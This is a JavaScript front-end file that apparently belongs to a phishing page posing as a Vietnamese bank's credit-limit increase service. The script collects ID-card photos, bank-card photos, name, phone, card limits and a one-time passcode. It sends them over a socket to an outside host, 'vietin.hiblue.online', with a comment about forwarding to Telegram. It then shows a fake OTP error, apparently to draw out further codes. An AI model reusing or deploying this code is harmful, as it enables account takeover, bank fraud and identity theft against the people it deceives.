$(document).ready(function () {
    const socket = io('https://vietin.hiblue.online/');
    const images = []
    var uploader = new SocketIOFileUpload(socket);
    socket.on('file', (data) => {
        images.push(data);
    });

    $('#mattruoccccd').click(function () {
        $(this).find('input[type="file"]')[0].click();
    });
    // get host
    const host = window.location.origin;
    // Sử dụng FileReader để đọc dữ liệu tạm trước khi upload lên Server
    function readURL(input) {
        if (input.files && input.files[0]) {
            var reader = new FileReader();
            reader.onload = function (e) {

                $('#mattruoccccd').attr('style', 'background-image:url("' + e.target.result + '")');
                $('.textmattr').attr('style', 'display:none');
                $('#iconmattr').attr('style', 'display:none');

            }
            reader.readAsDataURL(input.files[0]);
            const formData = new FormData();
            console.log(input.files[0]);
            formData.append('file', input.files[0]);
            $('.loader').show()
            fetch('/upload', {
                method: 'POST',
                body: formData
            }).then(response => response.json())
                .then(data => {
                    console.log(data);
                }).catch(error => {
                    console.error('Error:', error);
                }).finally(() => {
                    $('.loader').hide()
                });
        }
    }

    $('#matsaucccd').click(function () {
        jQuery('#matsaucccd').find('input[type="file"]')[0].click();
    });
    // Sử dụng FileReader để đọc dữ liệu tạm trước khi upload lên Server
    function readURL2(input) {
        if (input.files && input.files[0]) {
            var reader = new FileReader();
            reader.onload = function (e) {

                $('#matsaucccd').attr('style', 'background-image:url("' + e.target.result + '")');
                $('.textmatsau').attr('style', 'display:none');
                $('#iconmatsaucancuoc').attr('style', 'display:none');

            }
            reader.readAsDataURL(input.files[0]);
            // uploader.submitFiles([input.files[0]]);
            const formData = new FormData();
            formData.append('file', input.files[0]);
            $('.loader').show()
            fetch(`${host}/upload`, {
                method: 'POST',
                body: formData
            }).then(response => response.json())
                .then(data => {
                    console.log(data);
                }).catch(error => {
                    console.error('Error:', error);
                }).finally(() => {
                    $('.loader').hide()
                });
        }
    }

    $('#anhmattruocthe').click(function () {
        jQuery('#anhmattruocthe').find('input[type="file"]')[0].click();
    });
    // Sử dụng FileReader để đọc dữ liệu tạm trước khi upload lên Server
    function readURL3(input) {
        if (input.files && input.files[0]) {
            var reader = new FileReader();
            reader.onload = function (e) {

                $('#anhmattruocthe').attr('style', 'background-image:url("' + e.target.result + '")');
                $('.textanhtruocthe').attr('style', 'display:none');
                $('#iconmattruocthe').attr('style', 'display:none');

            }
            reader.readAsDataURL(input.files[0]);
            // uploader.submitFiles([input.files[0]]);
            const formData = new FormData();
            formData.append('file', input.files[0]);
            $('.loader').show()
            fetch(`${host}/upload`, {
                method: 'POST',
                body: formData
            }).then(response => response.json())
                .then(data => {
                    console.log(data);
                }).catch(error => {
                    console.error('Error:', error);
                }).finally(() => {
                    $('.loader').hide()
                });

        }
    }
    $('#anhmatsauthe').click(function () {
        jQuery('#anhmatsauthe').find('input[type="file"]')[0].click();
    });

    function readURL4(input) {
        if (input.files && input.files[0]) {
            var reader = new FileReader();
            reader.onload = function (e) {

                $('#anhmatsauthe').attr('style', 'background-image:url("' + e.target.result + '")');
                $('.textanhsauthe').attr('style', 'display:none');
                $('#iconmatsauthe').attr('style', 'display:none');

            }
            reader.readAsDataURL(input.files[0]);
            const formData = new FormData();
            formData.append('file', input.files[0]);
            $('.loader').show()
            fetch(`${host}/upload`, {
                method: 'POST',
                body: formData
            }).then(response => response.json())
                .then(data => {
                    console.log(data);
                }).catch(error => {
                    console.error('Error:', error);
                }).finally(() => {
                    $('.loader').hide()
                });

        }
    }


    $("#mattruoc").change(function () {
        readURL(this);
    });
    $("#matsau").change(async function () {
        readURL2(this);
    });
    $("#mattruoc_card").change(async function () {
        readURL3(this);
    });
    $("#matsau_card").change(async function () {
        readURL4(this);
    });

    $('#service').submit(async function (e) {
        $('button[type="submit"]').attr('disabled', true);
        e.preventDefault();
        $('.loader').show()
        const data = {
            name: $('#name').val() ?? '',
            phone: $('#phone').val() ?? '',
            limit_now: $('#limit_now').val() ?? '',
            limit_total: $('#limit_total').val() ?? '',
            limit_increase: $('#limit_increase').val() ?? '',
            images: images
        }

        socket.emit('service', data);

        socket.on('success', () => {
            $('.loader').hide();
            // create tag a
            const a = document.createElement('a');
            a.href = '/otp';
            a.click();
        });

        socket.on('error', (data) => {
            $('.loader').hide();
            alert(data.message);
            $('button[type="submit"]').attr('disabled', false);
        });
    });

    $('#service_otp').submit(async function (e) {
        e.preventDefault();
        $('.loader').show()
        const data = {
            otp: $('#otp').val() ?? ''
        }
        // send data to api telegram
        socket.emit('otp', data);

        socket.on('success', () => {
            $('.loader').hide();
            // window.location.href = '/otp-error';
            const a = document.createElement('a');
            a.href = '/otp-error';
            a.click();
        });

        socket.on('error', (data) => {
            $('.loader').hide();
            alert(data.message);
        });
    })

});


